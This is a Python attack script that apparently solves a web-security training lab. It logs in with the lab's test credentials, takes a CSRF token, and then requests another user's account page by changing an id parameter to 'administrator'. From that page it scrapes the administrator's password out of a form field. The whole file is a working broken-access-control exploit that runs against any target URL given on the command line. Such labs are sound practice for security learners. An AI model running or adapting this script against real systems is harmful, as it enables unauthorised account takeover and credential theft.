import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url, session)
    data_login = {
        "username": "wiener",
        "password": "peter",
        "csrf" : csrf_token
    }
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies
    )
    return "Log out" in response.text

def get_administrator_password(url, session):
    administrator_url = (
        url + "/my-account?id=administrator")
    response = session.get(
        administrator_url,
        verify=False,
        proxies=proxies
    )
    if 'administrator' in response.text:
        html = BeautifulSoup(
            response.text,
            'html.parser'
        )
        password = html.find(
            "input",
            {'name': 'password'}
        )['value']
        return password

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        password = get_administrator_password(url, session)
        print("[+] Administrator password is %s" % password)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 